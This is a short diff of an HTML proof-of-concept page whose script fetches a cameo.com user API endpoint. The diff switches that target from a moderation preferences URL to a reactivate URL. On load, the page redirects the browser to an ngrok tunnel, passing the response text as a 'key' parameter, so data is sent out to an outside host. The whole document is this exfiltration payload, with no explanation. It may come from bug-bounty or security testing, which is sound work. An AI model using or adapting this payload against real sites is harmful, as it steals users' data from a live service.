@@ -2,12 +2,12 @@
 <script>
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
-req.open('get','https://moderation.cameo.com/api/user/636aadcb01ac4cd9c8dc1287/preferences/locale',true); 
+req.open('get','https://www.cameo.com/api/user/reactivate',true); 
 req.withCredentials = false;
 req.send();
 
 function reqListener() {
-    location='//3126-41-103-106-145.ngrok.io/log?key='+this.responseText; 
+    location='https://41dc-105-111-199-227.eu.ngrok.io/log?key='+this.responseText; 
 };
 </script>
 </html>
